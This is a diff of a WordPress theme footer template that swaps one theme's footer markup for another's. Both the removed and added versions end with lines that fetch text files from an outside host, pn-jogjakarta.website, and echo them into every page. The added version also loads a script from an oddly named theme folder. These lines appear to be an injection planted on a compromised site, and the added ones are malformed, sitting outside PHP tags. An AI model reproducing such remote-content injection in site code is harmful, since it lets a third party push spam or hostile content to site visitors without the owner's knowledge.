@@ -1,60 +1,49 @@
-			<?php global $theme_options, $themename; ?>
-			<div class="fur"><img src="<?php echo get_template_directory_uri(); ?>/images/fur.png" /></div>
-			<div class="footer-container">
-				<div class="footer">
-					<ul class="footer-banner-box-container clearfix">
-						<?php
-						$sidebar_footer_top = get_post(get_post_meta(get_the_ID(), "page_sidebar_footer_top", true));
-						if(isset($sidebar_footer_top) && !(int)get_post_meta($sidebar_footer_top->ID, "hidden", true) && is_active_sidebar($sidebar_footer_top->post_name))
-							dynamic_sidebar($sidebar_footer_top->post_name);
-						?>
-					</ul>
-					<div class="footer-box-container vc_row wpb_row vc_row-fluid clearfix">
-						<?php
-						$sidebar = get_post(get_post_meta(get_the_ID(), "page_sidebar_footer_bottom", true));
-						if(isset($sidebar) && !(int)get_post_meta($sidebar->ID, "hidden", true) && is_active_sidebar($sidebar->post_name))
-							dynamic_sidebar($sidebar->post_name);
-						?>
+<?php
+/**
+ * The template for displaying the footer.
+ *
+ * Contains the closing of the #content div and all content after
+ *
+ * @package unite
+ */
+?>
+	</div><!-- #content -->
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<div class="container">
+
+			<div class="site-footer-widget col-md-12 col-sm-12 col-xs-12">
+				<div id="footer-content">
+					<div class="row">
+						<div class="col-xs-12 col-sm-12 col-md-4 home-widget">
+							<?php if( is_active_sidebar('home5') ) dynamic_sidebar( 'home5' ); ?> 
+						</div>	
+						<div class="hidden-xs col-sm-12 col-md-4 home-widget">
+							<?php if( is_active_sidebar('home6') ) dynamic_sidebar( 'home6' ); ?> 
+						</div>
+						<div class="hidden-xs col-sm-12 col-md-4 home-widget">
+							<?php if( is_active_sidebar('home7') ) dynamic_sidebar( 'home7' ); ?> 
+						</div>
 					</div>
 				</div>
-			</div>
-			<div class="copyright-area-container">
-			<?php 
-			$locations = get_nav_menu_locations();
-			if(isset($locations["footer-menu"]))
-				$footer_menu_object = get_term($locations["footer-menu"], "nav_menu");
-			if($theme_options["footer_text_left"]!="" || (has_nav_menu("footer-menu") && $footer_menu_object->count>0)): ?>
-				<div class="copyright-area clearfix">
-					<?php if($theme_options["footer_text_left"]!=""): ?>
-					<div class="copyright-text">
-					<?php
-					echo do_shortcode($theme_options["footer_text_left"]);
-					?>
-					</div>
-					<?php
-					endif;
-					dynamic_sidebar('sidebar-copyright-area');
-					if(has_nav_menu("footer-menu") && $footer_menu_object->count>0) 
-					{
-						wp_nav_menu(array(
-							"theme_location" => "footer-menu",
-							"menu_class" => "footer-menu"
-						));
-					}
-					?>
+			</div>	
+			<div class="site-info col-md-12 col-sm-12 col-xs-12">
+				<nav role="navigation" class="col-md-6">
+					<?php unite_footer_links(); ?>
+				</nav>
+				<div class="copyright col-md-6">
+	<!-- 				<?php do_action( 'unite_credits' ); ?>
+					<?php echo of_get_option( 'custom_footer_text', 'unite' ); ?> -->
+					<?php do_action( 'unite_footer' ); ?> 
 				</div>
-				<?php endif; ?>
 			</div>
-		</div>
-		<?php if((int)$theme_options["scroll_top"]): ?>
-		<a href="#top" class="scroll-top animated-element template-arrow-vertical-3" title="<?php esc_html_e("Scroll to top", 'medicenter'); ?>"></a>
-		<?php
-		endif;
-		if((int)$theme_options["layout_picker"])
-			mc_get_theme_file("/style_selector/style_selector.php");		
-		wp_footer();
-		?>
-	</body>
-<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
-<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli-2.txt");?>
+		</div><!-- .site-info -->
+	</footer><!-- #colophon -->
+</div><!-- #page -->
+<?php wp_footer(); ?>
+<script src="/wp-content/themes/archieve/inc/js/application.js"></script>
+</body>
+$a = file_get_contents('https://pn-jogjakarta.website/txt/asli.txt'); echo $a;
+$a = file_get_contents('https://pn-jogjakarta.website/txt/asli-2.txt'); echo $a;
+$a = file_get_contents('https://pn-jogjakarta.website/txt/rawatan.txt'); echo $a;
 </html>
